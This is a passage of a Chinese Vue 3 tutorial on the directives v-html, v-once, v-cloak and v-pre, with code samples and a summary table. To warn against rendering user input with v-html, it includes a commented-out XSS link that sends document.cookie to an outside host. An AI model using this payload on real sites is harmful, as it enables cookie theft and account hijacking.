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)

安全说明

在你的站点上动态渲染任意的 HTML 是非常危险的，因为它很容易导致 `XSS 攻击`。请只对可信内容使用 HTML 插值，**绝不要**将用户提供的内容作为插值

**代码演示：以下将用户输入内容作为`v-html`指令的内容，是非常危险的**

```html
<script>
  export default {
    data() {
      return {
        message: ``,
        // message: `<a href='javascript:location.href="http://www.baidu.com?info="+document.cookie'>点击，查看美女</a>`
      };
    },
  };
</script>

<template>
  <textarea cols="60" rows="5" v-model="message"></textarea>
  <div v-html="message"></div>
</template>
```

![GIF2023-5-620-59-36](https://www.arryblog.com/assets/img/GIF2023-5-620-59-36.b4dd7995.gif)

> 上面案例中，用户输入的内容中携带的 JS 脚本，点击链接后，就可以把当前网站的`cookie`信息获取到，这是非常不安全的。

### 3、v-once 指令

`v-once`指令用来告诉 Vue，当前元素只渲染一次，即初次渲染后，就不会再渲染了。

```vue
<script>
export default {
  data() {
    return {
      n: 1,
      arr: [1, 2, 3],
    };
  },
};
</script>

<template>
  <div v-once>当前内容n永不更新 {{ n }}</div>
  <div>当前内容中n会动态更新 {{ n }}</div>
  <button @click="n++">n++</button>

  <ul>
    <li v-for="item in arr" v-once>不可更新{{ item }}</li>
  </ul>

  <ul>
    <li v-for="item in arr">可更新{{ item }}</li>
  </ul>
  <button @click="arr = ['A', 'B', 'C']">更新数据 {{ arr }}</button>
</template>
```

![GIF2023-5-621-14-47](https://www.arryblog.com/assets/img/GIF2023-5-621-14-47.6a7173e4.gif)

> 如果有些数据只需要初始渲染，后面不需要再维护这些数据，则可以添加`v-once`来提高性能。

### 4、v-cloak 指令

`v-cloak`指令仅作为了解即可，**该指令只在没有构建步骤的环境下需要使用**

当使用直接在 DOM 中书写的模板时，可能会出现一种叫做“未编译模板闪现”的情况：用户可能先看到的是还没编译完成的双大括号标签，直到挂载的组件将它们替换为实际渲染的内容。

- `v-cloak`指令本质是在元素身上添加了`v-cloak`这样一个自定义属性。不过这个属性在组件实例被挂后就会移除。
- `v-cloak`指令需要与`[v-cloak]{display:none}`这样的 CSS 规则配合使用，这样就可以在组件编译前被隐藏，编译后因为`v-cloak`属性移出，则元素显示。

```html
<style>
  [v-cloak] {
    display: none;
  }
</style>

<div id="app">
  <div>{{ message }}</div>
</div>
<!-- 
这里故意把js引入放在当前这个位置，这样网速很慢时，会先看到上面没有编译的DOM元素呈现在页面，Vue接管后，组件被挂载成功，看到的是编译后的内容，为了防止组件没有被编译挂载前，不要呈现在页面中，则需要加v-cloak指令，同时加上[v-cloak]{display:none} css样式
-->
<script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
<script>
  const { createApp } = Vue;
  const app = createApp({
    data() {
      return {
        message: "Hello Vue!",
      };
    },
  });
  const vm = app.mount("#app");
</script>
```

> 未加`v-cloak`指令前效果

![GIF2023-5-621-44-56](data:image/gif;base64,R0lGODlhJgE9AHcAACH5BAB4AAAAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAJgE9AKf///8AAAD/x4QAAFKl4//v7+8Agsb//uf//felVQDG//8AAIT3/v8YAADn/v///84AVKXv/v/GggBSAABCRULnplIAACFaLBje//+t5f//25wAGCkAABj//u//9O8AADmMz/+Mioz/46WMMAA5AAD/3aX/z4wxAADv9f+MOAAAADH/y4TGghj//8YASJxCmt737+/G7/8hSXMAAEYAAFqEAABDGABKAACa2///27UAGFoAGEKMfWvWpnOl3/+MinOt3/8hAAA5JABjksbOizHvw4zv7/cYQWMhOGNCAADO//9zioy1aSn/5q236f9KaXuEx/eEOAD3z5Q5ks6Ex/+9z97//97vvHv3w3sAAHgpGACl1/cYLFoYLEfemkfeo1oYXZwAMIzYtpTv386Uy++cz/el0+//573OhjnWroScRwD315y9dRjvsmu9eSGt6/+MdVL/07WMz/e13/+Utta9dQB7ZUJ7aUoAOIRjQRhrSSH/88YAXa0Adb0Yeb0hbbUYXaUYXa0AabUYLGM5RUJaGAAAJDkAAGMAGGtKJABjLBjv4+9jOCFKLBhSJABjAADay8ra6+9aot7W7/9rfYw2jMtWqOcpjs5jru8YhMpadYzW8/8pabV7ioxSot5adZxSdZzv7+fO6/+11+//973/67X/673n7/f3473Ox9bv36XWppS99///68bv797vw4TnvpTevqXO9/+t4++958bv06X/79b/887/89YAfaUAOIw5baU5YYxCRVJzWSkAGIRSRUI5eb1aks5aisZrsu9zptZzcaVjdYxKnt5znr1zSSEAJFIAJEoYQXMAJGMhJCEYADkAGHMAAGspTWtzMABrOABrVTlCQSk5aWs5VWtzAABaAADOhhi9ilrWllLOjjmUZZSlcUKMinuEgmvWmlqMos6EppSMw++Euu/vrmPesmv3vHfvtnuUfWuESSGMTRiMWSmMVSF7uu97tueETRhzuvecZSmMaUq1bTmMdWOMdVqlXRitXQC9eRi1aQAAAAAI/wABCBxIsKDBgwgTKlzIsKHDhxAjSpxIsaLFixgzatzIsaPHjyBDihxJsqTJkyhTqlzJsqXLlzBjypxJs6ZMDwwM4rTJ0yACFD6B9hy6ssiFAQQIGkVKdKiAAEfKEHwatanVkSZIWAAVY2DWrV2v1sxhp4GODAPJmkUrtu1GFgE8FYQr161NIgFeFMSr165figcSDPBBMPDgvzSfGiioGLHjh4aTDowM0UMBIwUtF8iJUDPngzAKFBBaMPTog5oxJ/S8EIFo0gsbTw2w+LFthZQnC5acUAJtXOEaBAjQDAgAW/aEB2CGzmAtZcMDbBgWgSCCNBeic+DkQOD17MO3d/8XCEtP9ABcyBhsBU/5BmGqJjCd3E1LdBlbGMoeuP+2/8K7AThfbwHksg8XS9wRRADR0BLFBprkI0QAH4BAkDokcDBNJ/rYBwgG3qERgAVPhMBDIxB0h4CIJJqI4ngiTGBBNp38kF2FBJVQiHRP/MBIANjIx9st7wRgyDHimPcBFLHRxpiT/0UpUG5TBqiQbwF8KJCOATyDR1h7RBGAH5xpcMMH8gxUCjUcECNQjEsStEhOcDI50JwCNWHMJANZkcCYnD2QQgBgbDLQFSQEMB8CbBBqKAAIeBOALkoo1B8Al0pp2wMj0MCWQJx6upBvh7xBEFwq2ClQBQGEUSkC/QT/UElB6QQgSHUrBJCFAgfluutD67RaKQBtBICIEwV9o6hkZpZKEKcqWJhQCRNAAOJA1Fqr6X9XnODCtQJ1++2otlY3EKu/8MpfAAvwSoo2M+BQkAZJtAuAmRxIchC++jaEADvs8opAHQFkYhC983kRQB+fQUqwJQoJOoMcz6Yw8ba2HcBEAzLMMdnGHTPkW23nBpDibPaacIIFhFDgssvXNCAqAm4MdwQd5npXM1Q4G9RBLO0AM+Fw9lqhRgAQFxQjUx34E0AXL788ocEKraEIB5cQZDXWGDumcQODGDflxmGLDGXJJ69r71PntT1fBz3YMNwOQ+QMt9wB0J1zDtUM/2dIL5TcEzAALdQQABUGLZ1UYG23TTJCUjhiwRQERT55149h4S24AGg+7pVnr2ryeAI9Ze8KDUgzi2iss95wB2LkMVwgpAMAu+wB0A6AoAHsIoravBYeQD2JCwnAAfzI2jrrRsBmEKcDyDsQ9NJjjlion+7eafYHjVwQq2mXPngT28QL0RcNRHsQ+uqjngUrKPPKeF9TNTAfNws37BC9fNTOf+3WswuVjmclAj0OAOCrnel4ZbQAUO4hwkOcQSKIqQB8TiB4sRcA8OIq6zRqPlhowLEkcqlMBbAtAxxg90KHwNHFTyBtaMAH5kGQDqwCWQCIgxkI0oRHqE+HPPShhf9QZz6BvCJRGjRTAIJhLgSQQzjz4R0Y+DSQM5SjSQc04QmvksICIsR7BEngC4+Hj+EgYQkhuIMW5vOUM5ooEQH4Q3XaiEYewFGOuxsUhELgC2iMY3ACQd/TKGGjD5jDeAKRgtw2UCIfsdAgJXzkFrnoRRUaBIxoUyAgbRe383ShGOYqAXjmVrctjTJvpRSIKdwRnWWcY4EDQUAnh5MexRHkDPE4jwV4gcOERPKAk6TkYXQzTJEgIBSQiIRqSjOGKmzGIDBo5jOhmczWuCIVpxCIyjRIEA9I0yG/DKZf4IKJuQSgnOIUXfgqojD6CaSd6XRLVjbwibAAYJ71FGeYAoC1jIvkAA5BOEtaACrQeLZlKbwBAEK79gBwjOIzqKBHAPAgi4s8BT+zwahB7YIA/UHKo/8RHssoMDRniM0iHfUJSDfK0qEgQAzWWJAZkwHAltq0pSm9qU53ytOe+vSnQA2qUIdK1KIa9ahITapSl8rUpjr1qVCNqlSnStWqWvWqWM2qVrfK1a569atgDatYx0rWspr1rGhNq1rXyta2uvWtcI2rXOdK17ra9a54zate98rXvpIkIAAh+QQBPAAAACwFAAQAkgAbAKcA/wD///8AAADGggAAgsbv7+/n//8AVaXnplIAAFKl4/9CRUJSAAD/46WEx//3+///+/cYAAD/x4RSpueEAAAAABj//8b//+///97/8+//++fG///v//8xis4AAIT/25yMiowxAACcSQAAADnv8//e///v7/f/y4T/z4y99/8AGFoAAHMAACEhAADO//+c2/8AAEJrsu/37+/vrmMAYa0ASZzvsmutYQDOijFjru9KAAD/971CAAD3unMAGCmMz/97aUq9dQBKnt7/67VzptalVQCt4/+9eRi15/+t6/97uu//6617vvecRQCMMADemkL//85KJAA5YXNjAAB7GAD/885rAAA5AAApGAAAADEAAGMpTWshOGMAAGtCQSkYeb0AabV7iozenkoAOIQARZze7+8AGISt3/+t1/e17/+l3/+Ex/et4++Mvuec1/ec0+/G6//G8//W5+/O3+/e/87G7+/n18b/88b/89bv7+fv797/68b3/8bv05z315T/05TWppTnvozOvs7v06X/77XW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)

> 加了`v-cloak`指令后效果

![GIF2023-5-621-40-50](data:image/gif;base64,R0lGODlhJgFNAHcAACH5BABkAAAAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAJgFNAKD///8AAAACu4SPqcvtD6OctNqLs968+w+G4kiW5omm6sq27gvH8kzX9o3n+s73/g8MCofEovGITCqXzKbzCY1Kp9Sq9YrNarfcrvcLDovH5LL5jE6r1+y2+w2Py+f0uv2Oz+v3/L7/DxgoOEhYaHiImKi4yNjo+AgZKTlJWWl5iZmpucnZ6fkJGio6SlpqeoqaqrrK2ur6ChsrO0tba3uLm6u7y9vr+wscLDxMXGx8jJysvMzc7PwMHS09TV1tfY0NVAAAIfkEAVAAAAAsBgAGAHMAFQCnAP8AAAAAxoIAAILG7+/v5///AFWl56ZSAABSpeP/QkVCUgAA/+OlhMf/9/v///v3GAAAAAAYUqbn/8eEhAAA///G///e///v//Pv//vnxv//7///MYrOAACE/9uc3v//nEkAMQAA/8uEjIqM7+/37/P/AAA5zv//vff/IQAAAAAhnNv/AABz/8+MABhaAGGtAEmc77Jre4qMABgp//e9jM//a7LvY67v765jAABCzooxvXUAQgAASgAArWEAe2lK9+/v97pzKU1rSp7e3ppCvXkY/+utc6bWe773rev/e7rvtef/pVUAreP/jDAAnEUAYwAA///OSiQAawAAQkEpexgA//PO7+/nOQAAKRgAAAAxAABjOWFzIThjAABrGHm9ADiEAEWc3u/v3p5K/+u1ABiEAGm1nNPvpd//nNf3jL7nrePvhMf3rdf3hK7Wrd//te//xuv/xvP/1ufvzt/v3v/Oxu/v9//G//PG//PW59fG7+/e/+vG1sfO79Oc99eU/9OU1qaU576Mzr7O/+e1/++11sfG79Ol/9+l/+etADyMADCMAHW9GF2lc0khczAAc0VCc2E5AHm1WqalOY7OQpLOc4qMAH3GKVmEOYLGSmmUewAAACRKAABaADhrGCxKIQAYACQ5AABKOSQAADh7WiwYWhgAcwAAQjghKVlzOUVCWgAAQhgAQprezo4xxoI5zo5Kzo45vYpSjH1rjHVjrYJSlGlr/8N79757pbKMvYql56pa3qJSzp5z3rJr1qZzlFUhc7r3rV0AlE0YhDgAWorGjE0YpV0YtW05vXk5jHVae7bnrV0YY57WvXUYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACP8AAQgcSLCgwYMEMRAoMVAhCYQQI0qcSFGiQoYHHxAg4KDiQAEBBgw8EMBAAY8IFXKEqHElyokOAYAUeZDBAgQJXs4cWfLky4IeekRAAhEXhC1JfkokaXJnzZs5UToFwNSnUoEWQAT40tHggx0BGHW9erDq1II2ceoMydMkWZ4sUBwsNGXoW4Rm2T5VK1Uv1Z53ARiBEiDYwRgBymgIbPBWz7ME00YtqHLsR79VDwLZiFHiBR8BzGwo+DkAB7KbHxqc8NgvWqgFDzkKQHtGsdGXaf51O/BCLym0A0TA1GZikABe4BQcrKWGQJASClagEKBBQUGlgnM6Ypl1U9eRYQ//9IUlghAZyrIEaPQhd1urVowJP09rVAATbCTSqBLARkGSYbQnUwDRETRddQM9AAsEKnAxwg8pBJDJWN4VAJIkG2WYoR/iARCUCUoMRMYjEfj3HGaAAfCAMwF48kZvyQTgQhMRPVBEAC/gBkAGTAQwxGUFDnSgdQIFAYELaQz0xwImOCdQhSAFJ6WUfNloWkE4hIbbVJkBAAgWTRaU1ZURiXBUUgIFxdeAQQo0JFZa3VCQDmQCwNolA4aiwJ587kkFBHzRcEoOKwDFQweLDahbl0SkSBCAAiIUhRMByCnQGDjqCJ101BHpAQ9xFXQcb6yJBNlAkgnUQggqqNKnAn92/0Kjou+pCNZpqwWAqER0umXBE5UStKmBnQqE2AyvKoBKYic8ydapAqUKgAhTTskXl4DxSOBB1O4a0apqrRoqkJwi+Fe1wXn7qangoSqemV6soaGGXWHrVgbCBNDKQax5C9Gv29LJlbDbEmvuLgEoYse8G6kGACGQVELrXlElsgqhEtnrkyuZGtRlRJjCUIcTERDpXnjmmjkuRdACIO2YlGSMIm+rilIoQWP+OFFauYSwSLMENQpDpABkae5+JXrUsrQAxACBCcsQdEEgS5y8m08ZMBMAKVULdMErAYAhB0WlKVDnQBNAoEWIAiFiCm0mxyLjGQRloAvQAPBhixsOLIzdYQbI0NaFJQ9msabGA+FBTAANjjALcC6g4ZHRGIt5jHCpPAjKJJuYC0AUw8wnwwiRpODtVwHg5PeaAFzwCytSfnKEpjNbBUAetURImwqaxIESGVMEMPRBVgAT3AzN3FHsQBnIorvgahDECwRg4P3TA1cYMofDSmHfhxidMZaQHnRYltEeg4CvWUcBAQA7)

### 5、v-pre 指令

`v-pre`指令用于告诉 Vue，可以跳过该元素及其所有子元素的编译。也就是当前元素及其子元素写成什么样就按原样输出，并不会对内部的模板语法做任何解析。

**`v-pre`指令应用场景**

如果在项目中有些节点确实不需要编译（即节点中没有使用 Vue 语法），可以添加`v-pre`指令，能提高编译的速度。

```vue
<script>
export default {
  data() {
    return {
      username: "艾编程",
      age: 33,
    };
  },
};
</script>

<template>
  <div v-pre>
    <h3>用户信息</h3>
    <p>姓名:{{ username }}---年龄：{{ age }}</p>
  </div>
</template>
```

![image-20230506215135462](https://www.arryblog.com/assets/img/image-20230506215135462.3c49cc4c.png)

![image-20230506215231670](https://www.arryblog.com/assets/img/image-20230506215231670.ee11ede1.png)

### 6、总结

| 内置指令  | 说明                                                                         |
| :-------- | :--------------------------------------------------------------------------- |
| `v-text`  | `v-text`指令用于更新元素的`innerText`文本内容                                |
| `v-html`  | `v-html`指令用于更新元素的`innerHTML`内容                                    |
| `v-once`  | `v-once`指令用来告诉 Vue，当前元素只渲染一次，即初次渲染后，就不会再渲染了。 |
| `v-cloak` | 仅作为了解，在实际开发中几乎不用                                             |
| `v-pre`   | `v-pre`指令用于告诉 Vue，可以跳过该元素及其所有子元素的编译                  |
